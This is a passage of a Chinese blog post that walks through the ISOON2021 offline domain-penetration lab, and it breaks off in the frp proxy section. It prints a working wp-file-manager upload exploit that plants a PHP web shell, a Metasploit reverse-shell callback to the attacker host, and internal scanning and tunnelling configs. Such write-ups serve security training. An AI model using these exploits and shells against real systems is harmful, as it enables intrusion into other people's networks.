<!DOCTYPE html>
<html lang="zh-Hans">
  <head><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="description" content="ISOON2021 线下域渗透题解"/><meta name="keywords" content="域渗透, Shu1L's blog" /><link rel="alternate" href="/atom.xml" title="Shu1L's blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
<link rel="canonical" href="https://shu1l.github.io/2022/01/27/isoon2021-xian-xia-yu-shen-tou-ti-jie/"/>

<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />

<script id="baidu_push">
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
<script>
  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":"","latex":false};
</script>

    <title>ISOON2021 线下域渗透题解 - Shu1L's blog</title>
  <meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Shu1L's blog" type="application/atom+xml">
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>

  <body><div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/." class="logo">Shu1L's blog</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>

<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list"><a href="/">
        <li class="mobile-menu-item">Home
          </li>
      </a><a href="/archives/">
        <li class="mobile-menu-item">Archives
          </li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">Tags
          </li>
      </a><a href="/categories/">
        <li class="mobile-menu-item">Categories
          </li>
      </a><a href="/about/">
        <li class="mobile-menu-item">About
          </li>
      </a></ul>
</nav>
<div class="container" id="mobile-panel">
      <header id="header" class="header"><div class="logo-wrapper">
  <a href="/." class="logo">Shu1L's blog</a>
</div>

<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
          <a class="menu-item-link" href="/">
            Home
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/archives/">
            Archives
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/tags/">
            Tags
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/categories/">
            Categories
            </a>
        </li>
      <li class="menu-item">
          <a class="menu-item-link" href="/about/">
            About
            </a>
        </li>
      </ul></nav>
</header>

      <main id="main" class="main">
        <div class="content-wrapper">
          <div id="content" class="content"><article class="post">
    <header class="post-header">
      <h1 class="post-title">ISOON2021 线下域渗透题解
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2022-01-27
        </span></div>
    </header>

    <div class="post-toc" id="post-toc">
    <h2 class="post-toc-title">Contents</h2>
    <div class="post-toc-content">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ISOON2021-线下域渗透题解"><span class="toc-text">ISOON2021 线下域渗透题解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#拓扑图"><span class="toc-text">拓扑图</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x-01-web"><span class="toc-text">0x 01 web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-wiki"><span class="toc-text">0x02 wiki</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-OA"><span class="toc-text">0x03 OA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-db-iSoon2021-lab"><span class="toc-text">0x04 db.iSoon2021.lab</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-dc2-net-iSoon2021-lab"><span class="toc-text">0x05 dc2.net.iSoon2021.lab</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-dc1-net-iSoon2021-lab"><span class="toc-text">0x06 dc1.net.iSoon2021.lab</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-dc-iSoon2021-lab"><span class="toc-text">0x07 dc.iSoon2021.lab</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文章"><span class="toc-text">参考文章</span></a></li></ol></li></ol>
    </div>
  </div><div class="post-content"><h1 id="ISOON2021-线下域渗透题解"><a href="#ISOON2021-线下域渗透题解" class="headerlink" title="ISOON2021 线下域渗透题解"></a>ISOON2021 线下域渗透题解</h1><h3 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h3><p><a href="https://p5.ssl.qhimg.com/t011af99840a02d5218.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t011af99840a02d5218.png" alt="img"></a></p>
<p>注:写wp的时候因为换过一次环境，所以ip可能会有所变化~</p>
<h2 id="0x-01-web"><a href="#0x-01-web" class="headerlink" title="0x 01 web"></a>0x 01 web</h2><p><a href="http://192.168.10.48/" target="_blank" rel="noopener">http://192.168.10.48/</a></p>
<p>访问为一个wordpress</p>
<p><a href="https://p4.ssl.qhimg.com/t017c18fd07de76d54d.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t017c18fd07de76d54d.png" alt="img"></a></p>
<p>扫描目录，发现robots.txt</p>
<p><a href="https://p2.ssl.qhimg.com/t01ecf47cdfccb61ba1.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t01ecf47cdfccb61ba1.png" alt="img"></a></p>
<p>发现存在插件wp-file-manager，通过搜索发现一个任意文件上传漏洞</p>
<p><a href="https://github.com/w4fz5uck5/wp-file-manager-0day/blob/master/elFinder.py" target="_blank" rel="noopener">https://github.com/w4fz5uck5/wp-file-manager-0day/blob/master/elFinder.py</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Usage: %s http://localhost"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">"%s/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"</span> % sys.argv[<span class="number">1</span>]</span><br><span class="line">burp0_headers = &#123;<span class="string">"User-Agent"</span>: <span class="string">"curl/7.68.0"</span>, <span class="string">"Accept"</span>: <span class="string">"*/*"</span>, <span class="string">"Content-Type"</span>: <span class="string">"multipart/form-data; boundary=------------------------66e3ca93281c7050"</span>, <span class="string">"Expect"</span>: <span class="string">"100-continue"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>&#125;</span><br><span class="line">burp0_data = <span class="string">"--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"x.php\"\r\nContent-Type: image/png\r\n\r\n\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x01^\x00\x00\x01^\x04\x03\x00\x00\x00?\x05j)\x00\x00\x00\x1ePLTE\xff\xff\xff\xef\xef\xef\xe5\xe5\xe5\xce\xce\xce\xa1\xa1\xa1iiiVVVGGG333\x00\x00\x00g\x00\xcc\xe2\x00\x00\r\xc0IDATx\xda\xed]K[\xdb\xc8\x12m\xc9\xce^\xc6\x90\xbb58\t\xdc\x9dm\x9c\t\xd9\xd9X\x1e\xc2\x8e\x87I\xc22\t!\x93\xe5@xmc\x02\xf1\xda\x0f\xa9\xff\xed]`\xeb\xddVU\xc9C\xb5\xe6\xa2-\xd4\xa7\xf2Q\xe9\xa8\x1fuN\x8b\xdf\xb9\xba\xee\x84\xbc\"^\xd7\x83\xc7\x8f\xbc\x9a\x08\xa7\xb1F\xbb\xaa\x97\xf4\xc8:5\xf2^L,A\xbb\x8cSr\xe4\x055\xd2\xbc\x17\x0eC\xbe\xe4H\xf3NL*\x8f\x8f\xd2i\xbe\xf05Y\xf05\xffM\xf5[*\x95J\xb9\xc1\xb7\xdc\xb4\x8f\xde\x9f\x1e\xf5\xec\x86\x95\x83\xfa\xadv\xff\x92\xd3\xcb\xfd\xba]\xd1\x86\x1f\x92Q2\xeck\x19\xb8\xdc\x93FB\xa4&gt;\xf5[\xde\x91\x91k\xd2\xd1\x18\xdf\xeaG\x19\xbb\xdcCK\xd7\xfa-\x97\x12\x90\xb0.\xfcP&gt;\x9629a-\xf9\xd7\xdc\x95\x8a\xcb\xdd\xd6\x11\xdf\x1d\xa9\xbc&amp;5\xfd\xea\xf7\xe5@\x9d\xaf\xbc\xad\xe8\xc6\x0f\x85c9\xef:\xd0\x8c\x8d\x9d\xb9\xe9J\xa7\xa6\x17\xbe\xcb\x83\xf9\xf9\xca[\xad\xea\xd7\xd8MIW\xba-\x9d\xf8\xe1\x85L\xbdn-&#125;\xf87\x1d^)eK\x1f|\x97\x01\xe9\xfa\x15\xcc_\xbf\x10x\xa5[\xd3\x85\x1f\n\x03H\xbe\xf2\\\x17\xfe&#125;\x03JW\x8e+z\xe0k\x1c\xc3\xf2\x95m=\xea\xb7\x08LW\x8e\xf4\xe0\x87-h\xbe\xd3&#123;1\xf3\xaf\t-\x07)\xf7t\xc0\x17\\\x0eR\xf6u\xa8\xdfux\xbe\x0f\x8b\xb7\xbc\xfc\x00\xfa\x16\x87\xbe\xc9\xbc\xfc\x0b\xfcX&lt;\\\x9f\xf8\xf1E\x94\xef\x94\xd1x\xeb\xf7\r&amp;\xdf\xb1\xc5\xce\x0f\x98\xf2\x95\xb2\xc6\xcd\xbf\xc6wT\xbe\xfb\xdc\xf8\x16P\xe9\xca\x9f\xdc\xf5\xbb\x8c\xcbw\xc4\xcd\x0f\x1b\xb8|\xc7\x163\xff\xbe\xc5\xe5\xeb\xd6x\xf15p\xf4 e\x8b\xb7~\x91\xf4 e\x9b\x97\x1f\xcc\x012\xdf\xbfy\xf9\x17IgR\xf6y\xf1]\xc6\xe6;\xe4\xad\xdfg\xd8|G\x16+?\xac`\xf3\x1d\xf3\xf2\xef::_^|\xb7\xb0\xf9:\x16k\xfd\xbe\xc5\xe6\xebV\xb2\xf0Yf|\xf1\xf9\xd6X\xf1\xc5~\x8e\xa5\xcc\x19\xbe2o\xf8\xd6\x84q\xc9\x87/%_\xf3k\x8e\xf8![=&lt;&gt;\xbe\xcc\xfc@\xe13\xce\xef\x1b\xe5&#123;\xc1\x89\xef\x066\xdf\t/\xffR\xc6;\x9c\xf8\xaeP\xc6\xbf\x8c\xf8\xe2\xc7\xeb\xbc\xf3\x8b\"z&gt;\xc4\x8b\xef#\xcf73\xe3\x8b\x9e\xcf\x12\xac\xf8\x1a\xc7\xc8|\x99\xd7w\x04a=\x8a\x13_\xf4z_\x85\x19\xdfW\xf8\xf5T\xce\xf1/e\xbd\x9as\xfc\x8b%\xb43\xc1\x8c/\x92 \xf6\xd8\xf7\xe7\xf1\xfbY\xbc\xfbo\xaf\xb0\xaf\x1b\xf3\xfe&amp;j\x041\x14\xec\xfb\xc7\xe6\r\"\xdf\x03\xc1\xdf\x1f\xb5\x8b,_\xee\xfe(D\x01?tt1\xf7\x97&lt;f?\xccB\xfa\xa3\x8e1\x83\x1d\r\xfaS\xd7\x11sc\x1d\xf0-\xe2\xca\x81\xbd\xbf\x0f\xbc'\xdb\x8eF\xf2\xe0+\xfe\xc0\xf5&#123;\xb2\xf7\xa7\x16`\x9f\x8c\xcfB\x13|\xc5;\xd0\xcePM\xe8Q\xbfB\x14\x07\xf0\xb7M\x0b&#125;\x00\xe0\x8ds\xeb\xde/\xe5\xd7\xb7,\xa7\x03|+4\xc2\xd7H\xad`\xb7\xb6\x88|\x17\xa6\x1fJ\xad\xe0sK\x11\xc9\x82o*\x07\x8f\x03z'-\xf4\xb1)z\xb2mu$\x0f\xbe\xf3_\xb9\x1f\xd6\x9cH\x16|\x85x\x9d\xfe%\xd6\x86\x1f\x84\x10\xc2Tr\xc4\xa4\x1d\xfe\xa5\x9a\xe8\xbb\x0b\xef@\xf2X&#125;\xfc\t\xca\x1f\x93\xd3]\x9c^z\xc1\xfa\xf9$\x84\x9d\x8e\x05\x88d\xc1W\x88\xa5n\x94%~m\xc7#5\xf2\xd70\x9a\xa1\x9apz\x15h$\x0b\xbeB\x88B\xf3\xc3\x0c\xe3\xbb^\x03\x13\xc9\x81\xaf\x10B\x946\xedn\xf7\xa8kw\xd6p\xbf\x94\x07\xdfi\xceB\xfd\xd7\xbc\xf9\x1b\xe5\xcd'o\xfeFF\xde\xf0\xfd\xf2\xe7rVK\xb4k\xe9\xb4B\x8d\xbc\xa4\xde\xb3p/\xdc\xafG\xb4\xeb\xfd\xe0\xe8\xf1#'B\xdeS\xbd\xf4\xe45\xd5\xbf\xcf\xa5\xde\xf3\xda\x11\x0e\xd9K\xef\x94\x1c\xf9m\x8d\x1ay\x97\xb3\xf7\xed&gt;\x83\x1f\xde\xd3\xf7\xed\xe9\xfb\xf6\xf4&#125;\x8b\xfcimssss\xcd\xcaE\xfd\x1ae\xfb\xfd\xf5@J\xf7\xfe\xc8n\xe8?\xfe-\x07\xad\xf4\xeez\xab\xda\xe0\x9b&lt;\xbfhF\x16/~u,\x8d\xf15^\x0f\xe26o\x15m\xeb\xd7\xf83ie(\xb6\x18\xa0\x0b?$\xa7+e\xcf\xd2\x92\r\xe5Rl\xc4\xaaP\x13|\xd5\xd6t\xee\xbe\x86\xf5[\x9c\xb3\x9d\xeb\xd4\xb5\xe3\x07s\xeef\xe3\xa8\xa2\x1b\xff\xbe\x9e\xbf\xb3t\xa8\x19\xbei\x9b\xfbA/H\x1d\xea\xf7\x1d|#W\x07~H\xdf\xda\x0f:\xff\xf1\xf3/\xa0u\xe2V#|!\x9d\x13&gt;\xc0\xfc\xf5\xfbN\xa2:=\xb8\xf9\x01\xd6\xf9\xe3\xf5\"\xb0\xf3/\xb0\xf7\xf2\xb3&amp;\xf8B\x9b\xc9\xc7\x96\x1e\xf5\x0b\xee\x0cl\xe9&lt;?php system($_GET[\"cmd\"]); ?&gt;\r\n--------------------------66e3ca93281c7050--\r\n"</span></span><br><span class="line">requests.post(burp0_url, headers=burp0_headers, data=burp0_data)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"URL Shell: %s/wp-content/plugins/wp-file-manager/lib/files/x.php?cmd=&lt;CMD&gt;"</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    cmd = raw_input(<span class="string">"$ "</span>)</span><br><span class="line">    burp0_url = <span class="string">"%s/wp-content/plugins/wp-file-manager/lib/files/x.php?cmd=%s"</span> % (sys.argv[<span class="number">1</span>], cmd)</span><br><span class="line">    burp0_headers = &#123;<span class="string">"User-Agent"</span>: <span class="string">"curl/7.68.0"</span>, <span class="string">"Accept"</span>: <span class="string">"*/*"</span>, <span class="string">"Expect"</span>: <span class="string">"100-continue"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>&#125;</span><br><span class="line">    r = requests.get(burp0_url, headers=burp0_headers)</span><br><span class="line">    print(r.text)</span><br><span class="line">python2  .\wp-file-manager.py http://<span class="number">192.168</span><span class="number">.10</span><span class="number">.48</span>/</span><br></pre></td></tr></table></figure>

<p><a href="https://p2.ssl.qhimg.com/t012c603823e85f8395.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t012c603823e85f8395.png" alt="img"></a></p>
<p><strong>上线msf</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line"><span class="builtin-name">set</span> target 2</span><br><span class="line"><span class="builtin-name">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="builtin-name">set</span> lhost 172.168.1.128</span><br><span class="line"><span class="builtin-name">set</span> lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><a href="https://p4.ssl.qhimg.com/t014daf0d323649d465.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t014daf0d323649d465.png" alt="img"></a></p>
<p>查看内网网段</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">run</span><span class="bash"> get_local_subnets</span></span><br></pre></td></tr></table></figure>

<p><a href="https://p5.ssl.qhimg.com/t0122b5161d5559ba87.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t0122b5161d5559ba87.png" alt="img"></a></p>
<p>双网卡</p>
<p>挂路由，扫描内网存活主机</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run <span class="built_in">auto</span>route -s <span class="number">10.1</span><span class="number">.16</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line">auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure>

<p>扫描top100</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">22</span>,<span class="number">3389</span>,<span class="number">3306</span>,<span class="number">1433</span>,<span class="number">21</span>,<span class="number">25</span>,<span class="number">8080</span>,<span class="number">80</span>,<span class="number">81</span>,<span class="number">8081</span>,<span class="number">7001</span>,<span class="number">8000</span>,<span class="number">8088</span>,<span class="number">8888</span>,<span class="number">9090</span>,<span class="number">8090</span>,<span class="number">88</span>,<span class="number">8001</span>,<span class="number">82</span>,<span class="number">9080</span>,<span class="number">8082</span>,<span class="number">8089</span>,<span class="number">9000</span>,<span class="number">8443</span>,<span class="number">9999</span>,<span class="number">8002</span>,<span class="number">89</span>,<span class="number">8083</span>,<span class="number">8200</span>,<span class="number">8008</span>,<span class="number">90</span>,<span class="number">8086</span>,<span class="number">801</span>,<span class="number">8011</span>,<span class="number">8085</span>,<span class="number">9001</span>,<span class="number">9200</span>,<span class="number">8100</span>,<span class="number">8012</span>,<span class="number">85</span>,<span class="number">8084</span>,<span class="number">8070</span>,<span class="number">7002</span>,<span class="number">8091</span>,<span class="number">8003</span>,<span class="number">99</span>,<span class="number">7777</span>,<span class="number">8010</span>,<span class="number">443</span>,<span class="number">8028</span>,<span class="number">8087</span>,<span class="number">83</span>,<span class="number">7003</span>,<span class="number">10000</span>,<span class="number">808</span>,<span class="number">38888</span>,<span class="number">8181</span>,<span class="number">800</span>,<span class="number">18080</span>,<span class="number">8099</span>,<span class="number">8899</span>,<span class="number">86</span>,<span class="number">8360</span>,<span class="number">8300</span>,<span class="number">8800</span>,<span class="number">8180</span>,<span class="number">3505</span>,<span class="number">7000</span>,<span class="number">9002</span>,<span class="number">8053</span>,<span class="number">1000</span>,<span class="number">7080</span>,<span class="number">8989</span>,<span class="number">28017</span>,<span class="number">9060</span>,<span class="number">888</span>,<span class="number">3000</span>,<span class="number">8006</span>,<span class="number">41516</span>,<span class="number">880</span>,<span class="number">8484</span>,<span class="number">6677</span>,<span class="number">8016</span>,<span class="number">84</span>,<span class="number">7200</span>,<span class="number">9085</span>,<span class="number">5555</span>,<span class="number">8280</span>,<span class="number">7005</span>,<span class="number">1980</span>,<span class="number">8161</span>,<span class="number">9091</span>,<span class="number">7890</span>,<span class="number">8060</span>,<span class="number">6080</span>,<span class="number">6379</span>,<span class="number">8880</span>,<span class="number">8020</span>,<span class="number">7070</span>,<span class="number">889</span>,<span class="number">8881</span>,<span class="number">9081</span>,<span class="number">8009</span>,<span class="number">7007</span>,<span class="number">8004</span>,<span class="number">38501</span>,<span class="number">1010</span></span><br></pre></td></tr></table></figure>

<p><a href="https://p4.ssl.qhimg.com/t01f8ece47ec1e4ab7c.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t01f8ece47ec1e4ab7c.png" alt="img"></a></p>
<p>发现存活主机</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.67</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.67</span>:<span class="number">445</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.69</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.69</span>:<span class="number">22</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.69</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.69</span>:<span class="number">3306</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.80</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.80</span>:<span class="number">139</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.69</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.69</span>:<span class="number">8090</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span>:<span class="number">135</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.70</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.70</span>:<span class="number">80</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.67</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.67</span>:<span class="number">135</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span>:<span class="number">139</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span>:<span class="number">445</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.70</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.70</span>:<span class="number">135</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.80</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.80</span>:<span class="number">135</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.80</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.80</span>:<span class="number">445</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.80</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.80</span>:<span class="number">80</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span>:<span class="number">8080</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.70</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.70</span>:<span class="number">139</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.66</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.66</span>:<span class="number">135</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.66</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.66</span>:<span class="number">445</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.82</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.82</span>:<span class="number">139</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.67</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.67</span>:<span class="number">139</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span>:<span class="number">3306</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.68</span>:<span class="number">80</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.71</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.71</span>:<span class="number">445</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.70</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.70</span>:<span class="number">445</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.71</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.71</span>:<span class="number">135</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.71</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.71</span>:<span class="number">80</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.71</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.71</span>:<span class="number">139</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.66</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.66</span>:<span class="number">139</span> - TCP OPEN</span><br><span class="line">[+] <span class="number">10.1</span><span class="number">.16</span><span class="number">.82</span>:           - <span class="number">10.1</span><span class="number">.16</span><span class="number">.82</span>:<span class="number">80</span> - TCP OPEN</span><br></pre></td></tr></table></figure>



<h2 id="0x02-wiki"><a href="#0x02-wiki" class="headerlink" title="0x02 wiki"></a>0x02 wiki</h2><p>设置代理</p>
<p>上传frp到windows上<br>frps.ini</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">vhost_http_port</span> = <span class="number">10080</span></span><br><span class="line"><span class="attr">vhost_https_port</span> = <span class="number">10443</span></span><br><span class="line"><span class="attr">allow_ports</span> = <span class="number">1000</span>-<span class="number">50000</span></span><br></pre></td></tr></table></figure>

<p>攻击机运行frps</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">./frps</span> -c frps.ini</span><br></pre></td></tr></table></figure>

<p><a href="https://p3.ssl.qhimg.com/t016e449d1fc0e040f9.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t016e449d1fc0e040f9.png" alt="img"></a></p>
<p>frpc.ini</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">172.168</span>.<span class="number">1.128</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">[socks1]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6666</span></span><br><span class="line"><span class="attr">plugin</span> = 